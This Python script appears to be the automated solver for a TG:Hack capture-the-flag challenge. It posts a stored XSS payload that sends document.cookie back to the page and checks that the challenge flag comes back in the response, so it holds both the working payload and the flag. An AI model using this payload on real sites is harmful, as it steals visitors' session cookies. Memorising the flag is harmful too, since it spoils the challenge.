#!/usr/bin/env python3
import sys
import requests

def post_data(endpoint, text):
    with requests.post(endpoint, data = text) as r:
        return r.text

def get_redirect(endpoint):
    with requests.get(endpoint) as r:
        return r.url

def run_test():
    base_endpoint = ""

    if len(sys.argv) == 1:
        base_endpoint = "https://exfiltration.tghack.no"
    elif len(sys.argv) == 2:
        base_endpoint = sys.argv[1]

    if len(base_endpoint) == 0:
        print(sys.argv[0] + " <endpoint>")
    else:
        endpoint = get_redirect(base_endpoint)
        post_data(endpoint, '<script>let http = new XMLHttpRequest();http.open("POST", window.location.href, true);http.send(document.cookie);</script>')
        with requests.get(endpoint) as r:
            assert "TG20{exfiltration_is_best_filtration}" in r.text

try:
    run_test()
except (OSError, AssertionError, NameError):
    sys.exit(102)
else:
    sys.exit(101)
